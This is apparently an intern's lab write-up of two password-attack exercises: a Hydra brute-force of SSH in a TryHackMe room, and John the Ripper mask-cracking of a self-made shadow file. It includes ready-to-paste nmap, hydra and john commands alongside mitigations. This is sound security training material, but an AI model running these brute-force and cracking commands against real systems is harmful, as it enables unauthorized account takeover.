# Password Attacks — Lab Exercises

**Date:** 2025-10-18
**Author:** Aman Jiwani (intern)
**Scope:** Two lab exercises demonstrating common password attack techniques in a controlled environment:

* **1) Brute-force SSH login using Hydra** (TryHackMe `SS_HYFM` room)
* **2) Cracking hashed passwords with John the Ripper** (local test set)

---

## 1) Brute-force SSH login using Hydra

**Objective:** Demonstrate a dictionary/brute-force attack against an SSH service using `hydra`.

**Lab reference:** TryHackMe room used during this exercise: `SS_HYFM` (lab environment).

### Steps performed

1. **Service discovery & version detection** with `nmap`:

```bash
nmap -sV -p22 [ip_address]
```

*Interpretation:* Confirmed SSH is running on the target (port 22) and is reachable.

2. **Run Hydra to brute-force SSH login** using a known username and wordlist (rockyou):

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://[ip_address]
```

* `-l admin` sets the username to `admin`.
* `-P` points to the password list (rockyou.txt).
* `ssh://[ip_address]` targets the SSH service on the specified IP.

### Example output (abbreviated)

```
[22][ssh] host: 192.168.x.x   login: admin   password: 123456
1 of 1 target successfully completed, 1 valid password found
```

**Result:** Found a valid credential (`admin:123456`) — SSH login allowed.

### Notes & caveats

* Brute-force attacks are noisy: they generate many failed attempts and are likely to trigger IDS/IPS or account lockouts in production systems.
* Use only in authorized lab environments (like TryHackMe) or with explicit permission.

### Mitigations

* Enforce account lockout thresholds and exponential backoff for failed logins.
* Use multi-factor authentication (MFA) for SSH where possible (e.g., public key + passphrase, or OTP in addition to keys).
* Disable password-based SSH authentication; use key-based auth and strong passphrases.
* Monitor and alert on multiple failed SSH attempts and unusual source IPs.

---

## 2) Crack hashed passwords with John the Ripper

**Objective:** Create a small test dataset of easy-to-crack hashed passwords and crack them using John the Ripper with a mask attack.

### Steps performed (create test set)

Run these commands to generate a set of 10 test users with passwords composed of `3 lowercase letters + 2 digits` and store both the hashed `shadow`-style entries and the plaintexts for verification.

```bash
# create working directory
cd ~/john_lab
rm -f shadow_easy10.txt plain_passwords_easy10.txt

for i in $(seq -w 01 10); do
  user="easy${i}"
  pass="$(tr -dc 'a-z' </dev/urandom | head -c3)$(shuf -i10-99 -n1)"
  echo "$user:$(openssl passwd -6 "$pass"):18000:0:99999:7:::" >> shadow_easy10.txt
  echo "$user:$pass" >> plain_passwords_easy10.txt
done
```

This produces:

* `shadow_easy10.txt` — simulated `/etc/shadow`-style file with SHA-512 (`-6`) password hashes
* `plain_passwords_easy10.txt` — ground-truth plaintexts (for lab verification only)

### Crack using John with a mask suited to `lllDD` (3 letters + 2 digits)

```bash
# run John with a mask for 3 lowercase letters + 2 digits
sudo john --mask='?l?l?l?d?d' ~/john_lab/shadow_easy10.txt

# show cracked results
john --show ~/john_lab/shadow_easy10.txt

# verify plaintexts saved earlier
cat ~/john_lab/plain_passwords_easy10.txt
```

### Example output (abbreviated)

```
easy01:abc12
easy02:xyz99
...
```

**Result:** John the Ripper successfully cracked the weak mask-formatted passwords, demonstrating how easily short, low-entropy passwords can be recovered.

### Notes & caveats

* This exercise intentionally uses weak password patterns to illustrate the weakness of short predictable passwords.
* Do not run cracking tools against systems for which you do not have explicit authorization.

### Mitigations

* Enforce strong password policies (minimum length, complexity, banned password lists).
* Use passphrases or longer random passwords (recommended: at least 12+ high-entropy characters for user-chosen secrets).
* Store passwords using a modern, slow hashing algorithm with per-password salt (e.g., bcrypt, Argon2) and appropriate cost factors.
* Implement rate-limiting and multi-factor authentication to reduce the impact of recovered credentials.

---

## Artifacts & Commands (copy/paste)

```bash
# Discovery for SSH
nmap -sV -p22 [ip_address]

# Hydra brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://[ip_address]

# John the Ripper test dataset creation
cd ~/john_lab
rm -f shadow_easy10.txt plain_passwords_easy10.txt
for i in $(seq -w 01 10); do
  user="easy${i}"
  pass="$(tr -dc 'a-z' </dev/urandom | head -c3)$(shuf -i10-99 -n1)"
  echo "$user:$(openssl passwd -6 "$pass"):18000:0:99999:7:::" >> shadow_easy10.txt
  echo "$user:$pass" >> plain_passwords_easy10.txt
done

# John crack with mask
sudo john --mask='?l?l?l?d?d' ~/john_lab/shadow_easy10.txt
john --show ~/john_lab/shadow_easy10.txt
```

---

## Recommendations for report inclusion

* Include screenshots or terminal logs of the successful Hydra result and John `--show` output as evidence.
* Add exact timestamps and target IPs in a production report (omitted here for privacy/security of the lab environment).
* If this is for a lab submission (TryHackMe), include the room name and notes about scope and authorization.

---

*End of Password Attacks lab notes.*
